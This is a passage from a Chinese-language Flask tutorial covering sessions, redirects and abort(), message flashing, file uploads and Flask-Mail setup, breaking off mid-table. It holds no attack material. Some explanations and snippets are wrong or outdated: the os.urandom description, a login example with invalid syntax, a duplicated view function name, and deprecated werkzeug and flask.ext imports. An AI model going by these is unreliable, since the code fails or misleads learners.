<p>都是可以的，我这里用了一个随机的变量，而且是24位的。 <code>os.urandom(24)</code> 会从 0-9，a-z A-Z中随机选中24个字符串用做加密session的秘钥。或者称之为 “盐”。设置好之后执行下代码，然后在谷歌浏览器中找找这个session。在谷歌浏览器中找到<code>设置</code>，然后在最下面找到<code>高级</code>。<br> 找到<code>内容设置</code>。找到<code>Cookie</code>。<br> 然后找到<code>查看所有Cookie和网站数据</code> 搜索127.0.0.1<br> 到这个里就可以看到咱们添加的session值了，但是这个内容是加密后的。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423200644076.png"  alt="image-20200423200644076" style="zoom: 50%;">

<h3 id="获取session值"><a href="#获取session值" class="headerlink" title="获取session值"></a>获取session值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/get/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># session['username']   如果username不存在则会抛出异常</span></span><br><span class="line">    <span class="comment"># session.get('username')   如果username不存在会得到 none 不会报错 推荐使用</span></span><br><span class="line">    <span class="keyword">return</span> session.get(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure>

<p>这里咱们获取值一般是用<code>session.get(&#39;username&#39;)</code>这样即使session值不存在也不会抛出异常。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423205217176.png"  alt="image-20200423205217176" style="zoom:50%;">

<h3 id="删除清空session"><a href="#删除清空session" class="headerlink" title="删除清空session"></a>删除清空session</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/delete/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    session.pop(<span class="string">'username'</span>)</span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/clear/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">()</span>:</span></span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="comment"># 删除session中的所有数据</span></span><br><span class="line">    session.clear()</span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span></span><br></pre></td></tr></table></figure>

<h3 id="设置session的过期时间"><a href="#设置session的过期时间" class="headerlink" title="设置session的过期时间"></a>设置session的过期时间</h3><p>一般session都是有一个过期时间的，</p>
<blockquote>
<p>如果没有指定session的过期时间，那么默认是浏览器关闭就自动结束，<br>如果设置了session的permanent属性为True，那么过期时间是31天。</p>
</blockquote>
<p>默认<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423205342123.png"  alt="image-20200423205342123" style="zoom:60%;"></p>
<p>设置session的过期时间：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">app.config[<span class="string">'PERMANENT_SESSION_LIFETIME'</span>] = timedelta(days=<span class="number">7</span>)</span><br><span class="line">session.permanent = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>当只设置了<code>session.permanent = True</code>时，可以看到浏览器中127.0.0.1中的session过期时间为31天。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423205539390.png"  alt="image-20200423205539390" style="zoom:50%;">
 当设置 `app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)`时，可以看到session的过期时间变成7天了。
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423205547594.png"  alt="image-20200423205547594" style="zoom:50%;">

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line">app.config[<span class="string">'PERMANENT_SESSION_LIFETIME'</span>] = timedelta(days=<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 添加数据到session中</span></span><br><span class="line"><span class="comment"># 操作session的时候 跟操作字典是一样的。</span></span><br><span class="line"><span class="comment"># SECRET_KEY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'zhangsan'</span></span><br><span class="line">    <span class="comment"># 如果没有指定session的过期时间，那么默认是浏览器关闭就自动结束</span></span><br><span class="line">    <span class="comment"># 如果设置了session的permanent属性为True，那么过期时间是31天。</span></span><br><span class="line">    session.permanent = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># session['username']   如果username不存在则会抛出异常</span></span><br><span class="line">    <span class="comment"># session.get('username')   如果username不存在会得到 none 不会报错 推荐使用</span></span><br><span class="line">    <span class="keyword">return</span> session.get(<span class="string">'username'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/delete/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    session.pop(<span class="string">'username'</span>)</span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/clear/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">()</span>:</span></span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="comment"># 删除session中的所有数据</span></span><br><span class="line">    session.clear()</span><br><span class="line">    print(session.get(<span class="string">'username'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Flask-重定向和错误"><a href="#Flask-重定向和错误" class="headerlink" title="Flask 重定向和错误"></a>Flask 重定向和错误</h2><h3 id="redirect-函数"><a href="#redirect-函数" class="headerlink" title="redirect()函数"></a>redirect()函数</h3><p>Flask类有一个<strong>redirect()</strong>函数。调用时，它返回一个响应对象，并将用户重定向到具有指定状态代码的另一个目标位置。</p>
<p><strong>redirect()</strong>函数的原型如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Flask.redirect(location, statuscode, response)</span><br></pre></td></tr></table></figure>

<p>在上述函数中：</p>
<ul>
<li><strong>location</strong>参数是应该重定向响应的URL。</li>
<li><strong>statuscode</strong>发送到浏览器标头，默认为302。</li>
<li><strong>response</strong>参数用于实例化响应。</li>
</ul>
<h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><p>以下状态代码已标准化：</p>
<ul>
<li>HTTP_300_MULTIPLE_CHOICES</li>
<li>HTTP_301_MOVED_PERMANENTLY</li>
<li>HTTP_302_FOUND</li>
<li>HTTP_303_SEE_OTHER</li>
<li>HTTP_304_NOT_MODIFIED</li>
<li>HTTP_305_USE_PROXY</li>
<li>HTTP_306_RESERVED</li>
<li>HTTP_307_TEMPORARY_REDIRECT</li>
</ul>
<p><strong>默认状态</strong>代码为<strong>302</strong>，表示<strong>‘found’</strong>。</p>
<h4 id="样例一-1"><a href="#样例一-1" class="headerlink" title="样例一"></a>样例一</h4><p>在以下示例中，<strong>redirect()</strong>函数用于在登录尝试失败时再次显示登录页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, render_template, request</span><br><span class="line"><span class="comment"># Initialize the Flask application</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span></span><br><span class="line">   request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span> :</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h3 id="abort-函数"><a href="#abort-函数" class="headerlink" title="abort()函数"></a>abort()函数</h3><p>Flask类具有带有错误代码的<strong>abort()</strong>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Flask.abort(code)</span><br></pre></td></tr></table></figure>

<p><strong>Code</strong>参数采用以下值之一：</p>
<ul>
<li><strong>400</strong> - 用于错误请求</li>
<li><strong>401</strong> - 用于未身份验证的</li>
<li><strong>403</strong> - Forbidden</li>
<li><strong>404</strong> - 未不到</li>
<li><strong>406</strong> - 表示不接受</li>
<li><strong>415</strong> - 用于不支持的媒体类型</li>
<li><strong>429</strong> - 请求过多</li>
</ul>
<h4 id="样例二-1"><a href="#样例二-1" class="headerlink" title="样例二"></a>样例二</h4><p>让我们对上述代码中的<strong>login()</strong>函数稍作更改。如果要显示<strong>‘Unauthurized’</strong>页面，请将其替换为调用<strong>abort(401)</strong>，而不是重新显示登录页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, render_template, request, abort</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      <span class="keyword">if</span> request.form[<span class="string">'username'</span>] == <span class="string">'admin'</span> :</span><br><span class="line">         <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         abort(<span class="number">401</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'logged in successfully'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h5 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h5><p>注意表明post</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/login"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">'text'</span> <span class="attr">name</span> = <span class="string">username</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">'submit'</span> <span class="attr">value</span> = <span class="string">Login</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h5><ul>
<li><p>输入admin <img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424113759201.png"  alt="image-20200424113759201" style="zoom:50%;"></p>
</li>
<li><p>输入其它内容，触发abort（401）</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424113704823.png"  alt="image-20200424113704823" style="zoom:50%;">

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B.assets/image-20200424113725315.png"  alt="image-20200424113725315"></p>
<h2 id="Flask-消息闪现"><a href="#Flask-消息闪现" class="headerlink" title="Flask 消息闪现"></a>Flask 消息闪现</h2><p>一个好的基于GUI的应用程序会向用户提供有关交互的反馈。例如，桌面应用程序使用对话框或消息框，JavaScript使用警报用于类似目的。</p>
<p>在Flask Web应用程序中生成这样的信息性消息很容易。Flask框架的闪现系统可以在一个视图中创建消息，并在名为<strong>next</strong>的视图函数中呈现它。</p>
<p>Flask模块包含<strong>flash()</strong>方法。它将消息传递给下一个请求，该请求通常是一个模板。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flash(message, category)</span><br></pre></td></tr></table></figure>

<p>其中，</p>
<ul>
<li><strong>message</strong>参数是要闪现的实际消息。</li>
<li><strong>category</strong>参数是可选的。它可以是“error”，“info”或“warning”。</li>
</ul>
<p>为了从会话中删除消息，模板调用<strong>get_flashed_messages()</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">get_flashed_messages(with_categories, category_filter)</span><br></pre></td></tr></table></figure>

<p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。</p>
<p>以下闪现在模板中接收消息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">with</span> messages = get_flashed_messages() %&#125;</span><br><span class="line">   &#123;% <span class="keyword">if</span> messages %&#125;</span><br><span class="line">      &#123;% <span class="keyword">for</span> message <span class="keyword">in</span> messages %&#125;</span><br><span class="line">         &#123;&#123; message &#125;&#125;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, render_template, request, flash</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'admin'</span> <span class="keyword">or</span> \</span><br><span class="line">                request.form[<span class="string">'password'</span>] != <span class="string">'admin'</span>:</span><br><span class="line">            error = <span class="string">'Invalid username or password. Please try again!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">'You were successfully logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, error=error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>login.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% if error %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &#123;&#123; error &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/login"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">text</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; request.form.username &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Pssword:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  &#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">     &#123;% if messages %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">           &#123;% for message in messages %&#125;</span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     &#123;% endif %&#125;</span><br><span class="line">  &#123;% endwith %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Flask Message Flashing Example<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Do you want to <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">"&#123;&#123; url_for('login') &#125;&#125;"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">b</span>&gt;</span>log in?<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424134357446.png"  alt="image-20200424134357446" style="zoom:50%;">



<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424134512696.png"  alt="image-20200424134512696" style="zoom:50%;">



<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424134521156.png"  alt="image-20200424134521156" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424134528432.png"  alt="image-20200424134528432" style="zoom:50%;">



<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424134535905.png"  alt="image-20200424134535905" style="zoom:40%;">



<h2 id="Flask-文件上传"><a href="#Flask-文件上传" class="headerlink" title="Flask 文件上传"></a>Flask 文件上传</h2><p>在Flask中处理文件上传非常简单。它需要一个HTML表单，其enctype属性设置为“multipart / form-data”，将文件发布到URL。URL处理程序从<strong>request.files[]</strong>对象中提取文件，并将其保存到所需的位置。</p>
<p>每个上传的文件首先会保存在服务器上的临时位置，然后将其实际保存到它的最终位置。目标文件的名称可以是硬编码的，也可以从<strong>request.files[file]</strong>对象的filename属性中获取。但是，建议使用<strong>secure_filename()</strong>函数获取它的安全版本。</p>
<p>可以在Flask对象的配置设置中定义默认上传文件夹的路径和上传文件的最大大小。</p>
<table>
<thead>
<tr>
<th>app.config[‘UPLOAD_FOLDER’]</th>
<th>定义上传文件夹的路径</th>
</tr>
</thead>
<tbody><tr>
<td>app.config[‘MAX_CONTENT_PATH’]</td>
<td>指定要上传的文件的最大大小（以字节为单位）</td>
</tr>
</tbody></table>
<p>以下代码具有’<strong>/ upload’</strong> URL规则，该规则在templates文件夹中显示’<strong>upload.html’</strong>，以及<strong>‘/ upload-file’</strong> URL规则，用于调用<strong>uploader()</strong>函数处理上传过程。</p>
<p><strong>‘upload.html’</strong>有一个文件选择器按钮和一个提交按钮。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/uploader"</span> <span class="attr">method</span> = <span class="string">"POST"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">enctype</span> = <span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"file"</span> <span class="attr">name</span> = <span class="string">"file"</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>您将看到如下所示的界面。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424135529049.png"  alt="image-20200424135529049" style="zoom:50%;">



<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424135612781.png"  alt="image-20200424135612781" style="zoom:50%;">

<p>选择文件后，单击<strong>提交</strong>。表单的post方法调用<strong>‘/ upload_file’ URL</strong>。底层函数<strong>uploader()</strong>执行保存操作。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200424135621372.png"  alt="image-20200424135621372" style="zoom:50%;">

<p>以下是Flask应用程序的Python代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route('/uploader', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      f = request.files[<span class="string">'file'</span>] <span class="comment"># URL处理程序从request.files[]对象中提取文件，并将其保存到所需的位置。</span></span><br><span class="line">      f.save(secure_filename(f.filename)) <span class="comment"># 获取目标文件的名称</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">'file uploaded successfully'</span></span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h2><p>Flask通常被称为微框架，因为核心功能包括基于<strong>Werkzeug</strong>的WSGI和路由以及基于<strong>Jinja2</strong>的模板引擎。此外，Flask框架还支持cookie和会话，以及<strong>JSON</strong>，静态文件等Web帮助程序。显然，这不足以开发完整的Web应用程序。而Flask扩展就具备这样的功能<strong>。</strong>Flask扩展为Flask框架提供了可扩展性。</p>
<p>有大量的Flask扩展可用。Flask扩展是一个Python模块，它向Flask应用程序添加了特定类型的支持。Flask Extension Registry（Flask扩展注册表）是一个可用的扩展目录。可以通过<strong>pip</strong>实用程序下载所需的扩展名。</p>
<p>在本教程中，我们将讨论以下重要的Flask扩展：</p>
<ul>
<li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li>
<li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li>
<li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li>
<li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li>
</ul>
<p>每种类型的扩展通常提供有关其用法的大量文档。由于扩展是一个Python模块，因此需要导入它才能使用它。Flask扩展名通常命名为flask-foo。导入的操作如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">from flask_foo import [class, function]</span><br></pre></td></tr></table></figure>

<p>对于0.7以后的Flask版本，您还可以使用语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext <span class="keyword">import</span> foo</span><br></pre></td></tr></table></figure>

<p>对于此用法，需要激活兼容性模块。它可以通过运行flaskext_compat.py来安装：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flaskext_compat</span><br><span class="line">flaskext_compat.activate()</span><br><span class="line"><span class="keyword">from</span> flask.ext <span class="keyword">import</span> foo</span><br></pre></td></tr></table></figure>



<h2 id="Flask-邮件"><a href="#Flask-邮件" class="headerlink" title="Flask 邮件"></a>Flask 邮件</h2><p>基于web的应用程序通常需要具有向用户/客户端发送邮件的功能。<strong>Flask-Mail</strong>扩展使得与任何电子邮件服务器建立简单的接口变得非常容易。</p>
<p>首先，应该在pip实用程序的帮助下安装Flask-Mail扩展。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install Flask-Mail</span><br></pre></td></tr></table></figure>

<p>然后需要通过设置以下应用程序参数的值来配置Flask-Mail。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>参数与描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>MAIL_SERVER</strong>电子邮件服务器的名称/IP地址</td>
</tr>
<tr>
<td>2</td>
<td><strong>MAIL_PORT</strong>使用的服务器的端口号</td>
</tr>
<tr>
<td>3</td>
<td><strong>MAIL_USE_TLS</strong>启用/禁用传输安全层加密</td>
</tr>
<tr>
<td>4</td>
<td><strong>MAIL_USE_SSL</strong>启用/禁用安全套接字层加密</td>
</tr>
<tr>
<td>5</td>
